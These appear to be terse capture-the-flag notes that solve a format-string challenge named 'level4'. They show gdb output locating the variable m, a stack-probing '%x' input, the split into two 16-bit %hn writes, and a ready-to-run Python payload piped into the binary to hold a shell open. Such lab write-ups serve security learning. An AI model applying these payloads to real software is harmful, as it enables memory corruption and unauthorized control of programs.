find the adress of m 
```
    (gdb) info variables
    All defined variables:

    Non-debugging symbols:
    0x08048588  _fp_hw
    0x0804858c  _IO_stdin_used
    0x080486f8  __FRAME_END__
    0x080496fc  __CTOR_LIST__
    0x080496fc  __init_array_end
    0x080496fc  __init_array_start
    0x08049700  __CTOR_END__
    0x08049704  __DTOR_LIST__
    0x08049708  __DTOR_END__
    0x0804970c  __JCR_END__
    0x0804970c  __JCR_LIST__
    0x08049710  _DYNAMIC
    0x080497dc  _GLOBAL_OFFSET_TABLE_
    0x080497fc  __data_start
    0x080497fc  data_start
    0x08049800  __dso_handle
    0x08049804  stdin@@GLIBC_2.0
    0x08049808  completed.6159
    0x0804980c  dtor_idx.6161
    0x08049810  m
```

the address of m is 0x08049810 => \x10\x98\x04\x08

We want to write the value 0x01025544 to the memory location 0x08049810. First, we split the 32-bit value into two 16-bit parts:

0x01025544 can be split into:

Upper 16-bit: 0x0102 => 258

Lower 16-bit: 0x5544 => 21828


geting the arguments in the stack:
./level4 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')


Now, we need to write 0x5544 to 0x08049810 and 0x0102 to 0x08049812.


first_padding = 21828 - 8 = 21820
second_padding = (258 - 21828) % 65536 = 43966


python -c 'print("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%21820c%12$hn" + "%43966c%13$hn")' > /tmp/h

(cat /tmp/h; cat) | ./level4